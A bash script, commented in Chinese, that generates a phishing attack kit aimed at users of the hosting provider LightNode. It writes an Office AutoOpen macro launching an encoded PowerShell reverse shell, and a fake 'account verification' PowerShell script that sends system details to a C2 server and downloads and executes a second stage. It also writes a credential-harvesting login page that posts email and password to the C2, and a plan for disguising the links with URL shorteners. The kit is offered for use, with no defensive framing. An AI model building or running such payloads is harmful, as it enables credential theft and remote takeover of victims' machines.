#!/bin/bash
# 武器化载荷生成脚本
# 生成各种恶意载荷用于钓鱼攻击

set -e

OUTPUT_DIR="/workspace/lightnode_recon/payloads"
mkdir -p "$OUTPUT_DIR"

C2_SERVER="your-c2-server.com"
C2_PORT="443"

log() {
    echo "[+] $1"
}

# ============================================
# 载荷1: Office宏文档（.docm）
# ============================================

generate_office_macro() {
    log "生成Office宏文档..."
    
    cat > "$OUTPUT_DIR/LightNode_Account_Verification.vbs" << 'VBS_EOF'
Sub AutoOpen()
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    
    ' PowerShell one-liner (Base64编码)
    Dim psCommand
    psCommand = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAWQBPAFUAUgBfAEMAMgBfAFMARQBSAFYARQBSACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBieABdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJABQAFMARQBOAFYAWQBJAFIAOgB1AHMAZQByAG4AYQBtAGUAIAAgACsAIAAiACAAIgAgACsAIAAkAFAAUwBFAE4AVgBZAEkAUgA6AGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlACAAKwAgACIAUABTAD4AIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAYgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACAAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
    
    shell.Run psCommand, 0, False
End Sub
VBS_EOF
    
    log "Office宏文档已生成: $OUTPUT_DIR/LightNode_Account_Verification.vbs"
    log "注意: 需要手动转换为.docm格式"
}

# ============================================
# 载荷2: PowerShell脚本
# ============================================

generate_powershell_payload() {
    log "生成PowerShell载荷..."
    
    cat > "$OUTPUT_DIR/payload.ps1" << PS_EOF
# LightNode Account Verification Script
# 伪装成账户验证脚本

\$ErrorActionPreference = "SilentlyContinue"

# 显示虚假的验证界面
Write-Host "LightNode Account Verification" -ForegroundColor Green
Write-Host "Verifying your account..." -ForegroundColor Yellow
Start-Sleep -Seconds 2

# 收集系统信息
\$systemInfo = @{
    username = \$env:USERNAME
    computername = \$env:COMPUTERNAME
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {\$_.IPAddress -notlike "169.254.*"}).IPAddress
}

# 发送到C2服务器
\$json = \$systemInfo | ConvertTo-Json
\$bytes = [System.Text.Encoding]::UTF8.GetBytes(\$json)

try {
    \$request = [System.Net.WebRequest]::Create("https://${C2_SERVER}:${C2_PORT}/collect")
    \$request.Method = "POST"
    \$request.ContentType = "application/json"
    \$request.ContentLength = \$bytes.Length
    
    \$stream = \$request.GetRequestStream()
    \$stream.Write(\$bytes, 0, \$bytes.Length)
    \$stream.Close()
    
    \$response = \$request.GetResponse()
    \$response.Close()
} catch {
    # 静默失败
}

# 下载并执行第二阶段载荷
try {
    \$stage2 = Invoke-WebRequest -Uri "https://${C2_SERVER}:${C2_PORT}/stage2" -UseBasicParsing
    Invoke-Expression \$stage2.Content
} catch {
    # 静默失败
}

Write-Host "Verification complete!" -ForegroundColor Green
PS_EOF
    
    log "PowerShell载荷已生成: $OUTPUT_DIR/payload.ps1"
}

# ============================================
# 载荷3: HTML钓鱼页面
# ============================================

generate_html_phishing() {
    log "生成HTML钓鱼页面..."
    
    cat > "$OUTPUT_DIR/Account_Verification.html" << HTML_EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LightNode Account Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 400px;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #5568d3;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>LightNode</h1>
        </div>
        <h2>Account Verification Required</h2>
        <p style="color: #666; margin-bottom: 20px;">
            For your security, please verify your account credentials.
        </p>
        <form id="verifyForm" onsubmit="return submitForm(event)">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Verify Account</button>
        </form>
    </div>

    <script>
        function submitForm(event) {
            event.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // 发送到C2服务器
            fetch('https://${C2_SERVER}:${C2_PORT}/phish', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent
                })
            }).then(() => {
                // 重定向到真实登录页面（不引起怀疑）
                window.location.href = 'https://console.lightnode.com/user/login';
            }).catch(() => {
                alert('Verification failed. Please try again.');
            });
            
            return false;
        }
    </script>
</body>
</html>
HTML_EOF
    
    log "HTML钓鱼页面已生成: $OUTPUT_DIR/Account_Verification.html"
}

# ============================================
# 载荷4: 短链接生成
# ============================================

generate_short_links() {
    log "生成短链接配置..."
    
    cat > "$OUTPUT_DIR/short_links.txt" << EOF
# 短链接配置
# 使用bit.ly、tinyurl.com等服务创建短链接

原始链接: https://${C2_SERVER}/phish
短链接: https://bit.ly/lightnode-verify

原始链接: https://${C2_SERVER}/payload.ps1
短链接: https://tinyurl.com/lightnode-update

原始链接: https://${C2_SERVER}/Account_Verification.html
短链接: https://is.gd/lightnode-check

# 使用说明:
# 1. 访问短链接服务网站
# 2. 创建短链接指向上述原始链接
# 3. 在钓鱼邮件中使用短链接
EOF
    
    log "短链接配置已生成: $OUTPUT_DIR/short_links.txt"
}

# ============================================
# 主执行
# ============================================

main() {
    log "=== 武器化载荷生成开始 ==="
    log "输出目录: $OUTPUT_DIR"
    log "C2服务器: $C2_SERVER:$C2_PORT"
    
    generate_office_macro
    generate_powershell_payload
    generate_html_phishing
    generate_short_links
    
    log "=== 载荷生成完成 ==="
    log "所有载荷保存在: $OUTPUT_DIR"
    log ""
    log "下一步:"
    log "1. 配置C2服务器接收数据"
    log "2. 将载荷集成到钓鱼邮件中"
    log "3. 测试载荷执行"
}

main "$@"
